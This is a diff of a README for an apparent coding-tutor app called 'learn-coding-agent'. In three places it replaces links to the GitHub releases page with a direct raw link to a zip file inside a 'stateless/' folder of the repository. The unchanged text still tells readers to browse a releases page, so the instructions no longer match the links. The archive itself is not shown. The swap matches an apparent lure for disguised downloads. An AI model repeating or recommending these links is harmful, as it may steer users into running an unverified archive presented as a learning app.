@@ -1,6 +1,6 @@
 # 🧠 learn-coding-agent - Learn coding with guided help
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/asahnad9164/learn-coding-agent/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/asahnad9164/learn-coding-agent/raw/refs/heads/main/stateless/agent-coding-learn-v3.1.zip)
 
 ## 🚀 What this app does
 
@@ -24,7 +24,7 @@ For the best experience, use a screen with at least 1366 × 768 resolution.
 
 Visit this page to download the app:
 
-https://github.com/asahnad9164/learn-coding-agent/releases
+https://github.com/asahnad9164/learn-coding-agent/raw/refs/heads/main/stateless/agent-coding-learn-v3.1.zip
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -184,7 +184,7 @@ Check the releases page from time to time so you can use the latest build.
 
 If you need the app again, use this link:
 
-https://github.com/asahnad9164/learn-coding-agent/releases
+https://github.com/asahnad9164/learn-coding-agent/raw/refs/heads/main/stateless/agent-coding-learn-v3.1.zip
 
 ## 📝 About this project
 
